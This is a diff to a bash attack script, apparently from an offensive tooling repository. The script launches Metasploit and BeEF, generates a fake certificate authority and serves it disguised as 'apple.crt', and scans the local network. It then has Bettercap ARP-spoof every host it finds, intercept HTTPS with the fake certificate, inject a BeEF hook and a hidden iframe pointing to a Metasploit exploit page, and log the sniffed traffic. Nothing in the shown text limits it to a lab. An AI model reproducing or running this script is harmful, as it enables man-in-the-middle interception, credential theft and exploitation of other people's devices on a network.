@@ -27,43 +27,28 @@ YELLOW='\e[1;33m'
 CYAN='\e[1;36m'
 RESET='\e[0m'
 
-# --- Color Print Function ---
 color_print() {
-  local color=$1
-  local msg=$2
-  printf "${!color}%b${RESET}\n" "$msg"
+  printf "${!1}%b${RESET}\n" "$2"
 }
 
 # --- Root Check ---
-if [[ "$(id -u)" -ne 0 ]]; then
-  color_print RED "[X] Please run as ROOT..."
-  exit 1
-fi
+[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT..."; exit 1; }
 
-# --- Tools Installer ---
-for i in wget msfconsole beef-xss bettercap arp-scan; do
+# --- Kill previous BeEF/Metasploit processes ---
+pkill -f 'ngrok|ruby|msfconsole|apache2';wait
+
+# --- Tool Check ---
+for i in wget openssl metasploit-framework beef-xss apache2 bettercap arp-scan; do
   if ! command -v "$i" &>/dev/null; then
     color_print RED "[X] $i NOT installed!"
     apt install -y $i
   fi
 done
 
-# --- Detect active interface ---
+# --- Detect interface + LAN IP ---
 IFACE=$(ip route | grep '^default' | awk '{print $5}' | head -1)
-if [[ -z "$IFACE" ]]; then
-  color_print RED "[X] Could not detect active interface. Exiting."
-  exit 1
-fi
-
-# --- Get LAN IP ---
 LAN=$(ip -4 addr show "$IFACE" | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
-if [[ -z "$LAN" ]]; then
-  color_print RED "[X] Could not detect LAN IP. Exiting."
-  exit 1
-fi
-
-# --- Kill previous BeEF/Metasploit processes ---
-pkill -f 'ngrok|ruby|msfconsole';wait
+[[ -z "$IFACE" || -z "$LAN" ]] && { color_print RED "[X] Interface or IP detection failed"; exit 1; }
 
 # --- Start Metasploit ---
 color_print GREEN "[*] Starting Metasploit..."
@@ -113,32 +98,56 @@ sed -i -e 's|enable: false|enable: true|g' "$EVASION_YAML"
 color_print GREEN "[*] Starting BeEF..."
 cd /usr/share/beef-xss && ./beef -x &>/dev/null &
 
-# --- Discover clients with netdiscover ---
-color_print CYAN "[*] Scanning network ($IFACE) using arp-scan..."
-LIVE_HOSTS=$(mktemp)
-arp-scan --interface="$IFACE" --localnet --ignoredups --plain > "$LIVE_HOSTS"
+# --- Generate fake CA ---
+CERT_DIR="$HOME/.bettercap/certs"
+mkdir -p "$CERT_DIR"
 
-# Filter IPs (remove gateway IP)
-IPS=$(awk '{print $1}' "$LIVE_HOSTS" | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v "$LAN" | paste -sd ',' -)
+CERT_KEY="$CERT_DIR/bettercap.key"
+CERT_CRT="$CERT_DIR/bettercap.crt"
+CERT_PEM="$CERT_DIR/bettercap-ca.pem"
 
-color_print GREEN "[*] Devices detected:"
-awk '{printf "  IP: %-15s  MAC: %-18s\n", $1, $2}' "$LIVE_HOSTS"
+if [[ ! -f "$CERT_PEM" ]]; then
+  color_print YELLOW "[*] Generating fake CA certificate..."
+  openssl req -x509 -newkey rsa:2048 -nodes \
+    -keyout "$CERT_KEY" \
+    -out "$CERT_CRT" \
+    -days 3650 \
+    -subj "/CN=Bettercap MITM Proxy"
+  cat "$CERT_CRT" "$CERT_KEY" > "$CERT_PEM"
+  color_print GREEN "[✓] Fake CA created: $CERT_PEM"
+else
+  color_print GREEN "[✓] Existing fake CA found: $CERT_PEM"
+fi
+
+# --- Serve the cert over HTTP ---
+cp "$CERT_CRT" "/var/www/html/apple.crt"
+service apache2 start;service postgresql start
 
 # --- Final Info ---
 color_print GREEN "[*] BeEF Panel: http://$LAN/ui/panel"
 color_print GREEN "[*] BeEF USER: unk9vvn | PASS: 00980098"
 color_print GREEN "[*] BeEF > Commands > Misc > Create Invisible Iframe > URL: http://$LAN:8080/pwn > Execute"
 
+# --- Scan network ---
+color_print CYAN "[*] Scanning LAN to find targets..."
+TARGETS=$(arp-scan --interface="$IFACE" --localnet --ignoredups --plain | awk '{print $1}' | grep -v "$LAN" | paste -sd ',' -)
+[[ -z "$TARGETS" ]] && { color_print RED "[X] No targets found."; exit 1; }
+
 # --- Run Bettercap ---
 color_print GREEN "[*] Starting Bettercap MITM attack..."
 
 bettercap -iface "$IFACE" -eval "\
-set arp.spoof.targets $IPS; \
+set arp.spoof.targets $TARGETS; \
 set arp.spoof.internal true; \
-set net.sniff.verbose true; \
-set https.proxy.sslstrip true; \
+set https.proxy.engine true; \
+set https.proxy.sslstrip false; \
+set https.proxy.cert $CERT_CRT; \
+set https.proxy.key $CERT_KEY; \
 set http.proxy.injectjs https://$LAN/jqueryctl.js; \
-arp.spoof on; net.sniff on; https.proxy on"
+set http.proxy.injecthtml '<iframe src=\"http://$LAN:8080/pwn\" width=0 height=0 style=\"display:none\"></iframe>'; \
+set net.sniff.verbose true; \
+set net.sniff.output /tmp/bettercap.log; \
+net.sniff on; http.proxy on; https.proxy on; arp.spoof on"
 ```
 
 _Run & Execute_
